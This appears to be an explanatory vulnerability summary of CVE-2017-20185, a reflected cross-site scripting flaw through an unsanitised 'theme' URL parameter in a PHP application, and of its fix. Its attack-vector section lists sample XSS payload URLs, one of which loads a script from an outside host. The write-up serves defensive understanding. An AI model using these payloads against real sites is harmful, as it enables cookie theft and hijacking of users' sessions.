Based on the provided content, here's a breakdown of the vulnerability associated with CVE-2017-20185:

**Root Cause of Vulnerability:**

- The application directly uses the `theme` GET parameter from the URL in the HTML output without proper sanitization or validation.

**Weaknesses/Vulnerabilities Present:**

- **Cross-Site Scripting (XSS):** The application is vulnerable to reflected XSS because it echoes the `theme` parameter into the HTML without encoding.
- **Undefined Index Error:** The code produced a PHP "Undefined index" error when the `theme` parameter was not present in the URL.

**Impact of Exploitation:**

- **XSS:** An attacker could inject malicious JavaScript into the page, which could be used to steal cookies, redirect users to malicious sites, or perform other actions on the user's behalf. This is demonstrated by the attacker injecting a script tag pointing to an external javascript source.
- **Denial of Service (DoS):** Although not the primary impact, an attacker could inject arbitrary HTML, which could cause the page to render improperly or become unusable, potentially leading to a denial of service.

**Attack Vectors:**

- The attack vector is via a crafted URL with a malicious payload in the `theme` parameter. For example:
    - `http://[your_url]/?theme=<script>alert('XSS')</script>`
    - `http://[your_url]/?theme=%22%3E%3Ch1%3EHELLO%20This%20is%20pretty%20dangerous%3C/h1%3E`
    - `http://[your_url]/?theme=%22%3E%3Cscript%20src=%22http://xss.rocks/xss.js%22%3E%3C/script%3E`

**Required Attacker Capabilities/Position:**

- The attacker needs to be able to craft and send a URL containing the malicious payload to the victim. No specific privileges are needed. The attacker can induce a victim to visit the malicious link.

**Mitigation:**

- The vulnerability was fixed by:
    - Checking if the provided theme file actually exists in the `css/themes` directory before using it.
    - Reverting to the default theme if the requested theme file does not exist.

**Additional Notes:**
- The provided content shows a pull request and commit that specifically address and fix this XSS vulnerability and the 'Undefined index' error, suggesting the information is highly relevant to the CVE.
- The fix involves sanitizing the input by using `basename` to extract the file name from the `theme` parameter and then verifying if the file exists using `file_exists` before using the theme.
